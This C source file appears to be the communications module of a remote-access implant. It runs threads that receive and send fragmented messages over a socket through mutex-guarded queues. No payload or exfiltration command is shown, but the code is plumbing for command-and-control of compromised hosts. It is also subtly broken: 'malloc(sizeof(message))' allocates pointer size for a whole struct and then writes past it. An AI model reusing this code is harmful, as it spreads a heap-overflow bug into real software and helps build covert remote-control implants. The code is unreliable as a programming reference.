#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "agent_comms.h"

// Global variables
// Receive Queue
extern struct Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
// Send Queue
extern struct Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;

void *agent_receive(void *vargp){
	int *sockfd = (int*)vargp;
	Fragment fragment;
	
	for (;;){		
		// get first chunk which contains total message size
		printf("size of fragment: %d\n", sizeof(Fragment));
		int nbytes = recv(*sockfd, (void*)&fragment, FRAGMENT_SIZE, 0);
		printf("Nbytes: %d\n", nbytes);
		if (nbytes <= 0){
			if (nbytes == 0){
				debug_print("%s\n", "connection closed");
				exit(RET_OK);
			}
			else {
				printf("recv error\n");
				exit(RET_ERROR); 
			}
		}
		
		if (ntohl(fragment.index) == 0){
			debug_print("received fragment 0: type: %d, index: %d, size: %d, payload: %s\n", ntohl(fragment.type), ntohl(fragment.index), nbytes, fragment.first_payload.actual_payload);
		}
		else{
			debug_print("received fragment n: type: %d, index: %d, size: %d, payload: %s\n", ntohl(fragment.type), ntohl(fragment.index), nbytes, fragment.next_payload);
		}
		
		Queue_Message* message = malloc(sizeof(message));
		message->fragment = malloc(nbytes + 1);
		message->id = -1;
		message->size = nbytes;
		memset(message->fragment, 0, nbytes + 1);
		memcpy(message->fragment, &fragment, nbytes);
		
		enqueue(agent_receive_queue, &agent_receive_queue_lock, message);
	}
	return 0;	
}

void *agent_send(void *vargp){
	int *sockfd = (int*)vargp;
	Queue_Message* message;
	
	for(;;){
		if (!(message = dequeue(agent_send_queue, &agent_send_queue_lock))) continue;
		
		if (ntohl(message->fragment->index) == 0){
			debug_print("sending fragment: type: %d, index: %d, size: %d\n", ntohl(message->fragment->type), ntohl(message->fragment->index), ntohl(message->fragment->first_payload.total_size));
		}
		else{
			debug_print("sending fragment: type: %d, index: %d\n", ntohl(message->fragment->type), ntohl(message->fragment->index));
		}
		
		int nbytes = send(*sockfd, message->fragment, message->size, 0);
		if (nbytes != message->size){
			printf("Send error\n");
			exit(-1);
		}
		
		free(message->fragment);
		free(message);
	}
	return 0;	
}


